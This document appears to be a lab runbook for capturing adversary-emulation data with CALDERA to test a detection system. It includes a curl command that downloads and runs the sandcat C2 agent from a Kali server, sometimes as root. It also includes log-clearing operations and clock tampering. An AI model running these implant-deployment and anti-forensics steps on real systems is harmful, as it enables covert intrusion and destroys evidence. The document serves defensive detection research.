# Running the LAB_TEST_SUITE capture campaign

Concrete steps to capture the data that exercises S1–S18, using this folder's tools. Follows
`LAB_TEST_SUITE.md` §5/§6/§9. **The 4 test operations are scored once, at the end, after every
prerequisite is done and ARGUS is frozen — these steps produce the data, not the score.**

Tools used: `make-victim.sh`, `run-victim.sh`, `benign.sh`, `build_linux_profile.py`,
`capture.sh`, and (ingest) `../../tools/apt_capture/{caldera_report,to_argus_case,to_citar_windows}.py`.
`KALI` below = Kali's current lab IP (this boot: `192.168.2.7`); `KEY` = `ADMIN123`.

---

## 0. One-time setup (before the burn-in)

1. **Kali log receiver** (forwarded-logs sink for S10) — once on Kali:
   ```bash
   sudo tee /etc/rsyslog.d/10-lab-receiver.conf >/dev/null <<'EOF'
   module(load="imtcp")
   input(type="imtcp" port="514")
   template(name="perhost" type="string" string="/var/log/lab/%HOSTNAME%/forwarded.log")
   *.* ?perhost
   EOF
   sudo mkdir -p /var/log/lab && sudo systemctl restart rsyslog
   ```
2. **Build the 5th victim** ws-hr01 (test-only victim set) and rebuild all with the current seed
   (adds rsyslog-forward, cron maintenance, sshpass; VMs stopped):
   ```bash
   for n in web01:web app01:app ws-dev01:dev ws-fin01:fin ws-hr01:hr; do
     ./make-victim.sh "${n%%:*}" "${n##*:}" "$KALI"
   done
   ```
   (Run in **bash**, not zsh, so the split works: `bash -c '...'`.)
3. Boot the four design victims (ws-hr01 only for its test runs), update `fleet.txt` IPs,
   then **verify every sensor + forwarding** on each victim:
   ```bash
   systemctl is-active auditd rsyslog cron
   sudo /usr/sbin/auditctl -l | wc -l          # ~18
   logger "lab-forward-test from $(hostname)"   # then check it appears on Kali:
   ```
   On Kali: `sudo tail /var/log/lab/*/forwarded.log` — the test line should be there within seconds.
4. **Log forwarding to the Mac** (replaces the SSH pull): every victim streams `audit.log`,
   `auth.log` and `benign-activity.log` to the Mac as they are written. Start the receiver on the
   Mac (it prints the Mac's address), then once on each victim, **before** the burned-in snapshot:
   ```bash
   python3 log_receiver.py setup-test                 # on the Mac, own tab; Ctrl-C when done
   scp forward-logs.sh <user>@<ip>:~/                 # once per victim
   sudo ./forward-logs.sh <MAC_IP>                    # on each victim
   ```
   The receiver prints `forwarding test received from <host>` for each victim. Delete
   `captured/setup-test` afterwards.
5. **Burn-in snapshot:** after the burn-in (step 1 below) completes, stop every VM and
   `qemu-img snapshot -c burned-in victims/<v>/disk.qcow2`. Every later run reverts to it.

---

## 1. Burn-in (history; triage-only, no CALDERA)

Goal: ≥20 benign windows/host (≈10 h) so C4/F1/benign scoring have per-host history (§3.4).

Per victim, start the persona **session-separated from any login** (so it is never an ancestor
of the agent — S1 / §4.2), running forever (`0`):
```bash
scp benign.sh <user>@<ip>:~/                     # once per victim
# on each victim:
sudo systemd-run --unit=benign --uid="$USER" \
   --setenv=PEERS="<peer-ips>" --setenv=LAB_PASS=<lab-password> \
   /home/$USER/benign.sh <role> 0
```
Start one network capture for the whole burn-in: `./capture.sh start burnin`. Let it run ~10 h
(logrotate + auditd-restart fire from cron automatically). Then `./capture.sh stop burnin`,
`./capture.sh pull burnin`, and **snapshot `burned-in`** (step 0.5). (The burn-in was captured by
SSH pull; every later run uses the receiver, §2.) Import `burnin` into the
workbench **without** a CALDERA report → it is history, never design/test.

---

## 2. Each operation (runs 2, 3, tests 1–4) — the §6 loop

Replace `<RUN>`, `<PROFILE>`, victims and conditions from the table in §3 below.

**Before**
```bash
# revert every victim used this run to burned-in (VM stopped), then boot:
qemu-img snapshot -a burned-in victims/<v>/disk.qcow2        # per victim, stopped
sudo ./run-victim.sh <v>                                     # per victim, own tab
# update fleet.txt IPs, then write the manifest:
```
Write `captured/<RUN>/manifest.json` by hand: run name, role (design/test), profile, victims,
agent file name per host, log-clear hosts (root agent there), clock-offset host, and every
experimenter action with a UTC time (§6.2/§6.6).

**Start capture + receiver + benign, leave ≥2 benign windows**
```bash
python3 log_receiver.py <RUN>        # own tab, leave it open: logs land in captured/<RUN>/<host>/
./capture.sh start <RUN>             # network capture; check captured/<RUN>/network/campaign.pcap grows
# persona already running from boot if you didn't revert it off; else systemd-run as in §1
```
Watch the receiver's table (every 30 s): every victim's `audit.log` count must keep rising. A
host marked `QUIET` is fixed now, not after the run.

**Build the profile + deploy the agent (separate session, renamed per run = S15)**
```bash
CALDERA_KEY="$KEY" python3 build_linux_profile.py --profile <PROFILE> \
    --server "http://$KALI:8888" --manifest "captured/<RUN>/profile.json"
```
On each victim, in a **fresh SSH login by the experimenter** (not the persona session), with a
**different file name each run**; deploy as **root on log-clearing hosts** (L3):
```bash
server="http://$KALI:8888"; NAME="<unique-name-this-run>"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "architecture:arm64" \
     $server/file/download > "$NAME"
chmod +x "$NAME"; ./"$NAME" -server $server -group red -v &     # sudo ./"$NAME" on log-clear hosts
```
Special conditions:
- **Clock offset** (run 3, ws-dev01, S12): `sudo chronyc -a 'manual on'; sudo date -s '+18 min'` (record the offset in the manifest).
- **Log clearing** runs: the profile's T1070 abilities clear logs; the forwarded copies on Kali survive (S10).

**Run the operation** in the CALDERA UI: Operations → new → adversary **ARGUS-Linux-<PROFILE>**
→ group `red` → Start. Do not pause it. Log start/stop times in the manifest.

**After (≥2 benign windows, then collect)**
```bash
./capture.sh stop <RUN>
# Ctrl-C the receiver, then confirm every host's copy covers the whole operation:
python3 log_receiver.py <RUN> --check      # must end with "complete"; otherwise recapture
# log-clearing runs only, the local view (S10), into its own folder so it never mixes with
# the forwarded copy:  ./capture.sh pull <RUN>-local   (then copy the report into it)
# Zeek over the pcap (Zeek is on the Mac):
( cd "captured/<RUN>/network" && zeek -C -r campaign.pcap )
# ground truth from the CALDERA report (download it to captured/<RUN>/attack_report.json):
cd <repo root> && export PYTHONPATH="source code"
python tools/apt_capture/caldera_report.py "Test Setup/lab/captured/<RUN>/attack_report.json" \
    --out "Test Setup/lab/captured/<RUN>/ground_truth.json"
```

**Ingest.** In the workbench: **Import capture** → `<RUN>` with its CALDERA report → check the
role line → Import. Design runs → **Learn new rules**, then review. Test runs → import but
**do not open** until the final score. From a terminal instead (same converter):
```bash
cd <repo root>
.venv/bin/python tools/apt_capture/auditd_to_windows.py "Test Setup/lab/captured/<RUN>" \
    --report "Test Setup/lab/captured/<RUN>/<report>.json" \
    --ground-truth "Test Setup/lab/captured/<RUN>/ground_truth.json" --out cases_lab --name <RUN>
```

**Re-capture (never patch) if** a gate fails beyond logged protocol actions, a CALDERA step
matches no process, or the operation stalls before its last tactic (§6).

---

## 3. The runs (order fixes the role — §5)

| <RUN> | role | PROFILE | victims | special |
|---|---|---|---|---|
| burnin | history | none | 4 (+ws-hr01 separately) | personas only; cron logrotate+auditd-restart |
| run2 | design | B | web01 app01 ws-dev01 ws-fin01 | agent renamed |
| run3 | design | C | web01 app01 ws-dev01 ws-fin01 | log-clear on 2 (root agent), ws-dev01 clock offset, forwarded |
| test1 | test | B | **ws-hr01** app01 ws-dev01 ws-fin01 | new victim set |
| test2 | test | D | web01 app01 ws-dev01 ws-fin01 | agent renamed |
| test3 | test | E | web01 app01 ws-dev01 ws-fin01 | log-clear on 2, forwarded |
| test4 | test | C | web01 **ws-hr01** ws-dev01 ws-fin01 | log-clear on 2, forwarded |

Order of work (§9): burn-in → run2 → (build P1/P2/P7/P11) → run3 → (build P3/P4/P6/P8) →
learn + **freeze** → tests 1–4 (captured and imported, not opened) → score once.

---

## 4. Per-run checklist

- [ ] reverted to `burned-in`; clocks within 5 s of Kali (except run3's planned offset)
- [ ] `auditctl -l` ~18 rules; `auditd rsyslog cron` active
- [ ] manifest written (profile, ability IDs, victims, agent names, conditions, times)
- [ ] receiver running and every victim's `audit.log` count rising; pcap growing
- [ ] ≥2 benign windows before the op
- [ ] agent deployed from a separate login, renamed; root agent on log-clear hosts
- [ ] operation ran to its last tactic (no stall)
- [ ] ≥2 benign windows after; capture and receiver stopped; `log_receiver.py <RUN> --check`
      says complete; Zeek + report collected (+ `<RUN>-local` on log-clearing runs)
- [ ] design: rules learned + reviewed | test: imported, not opened
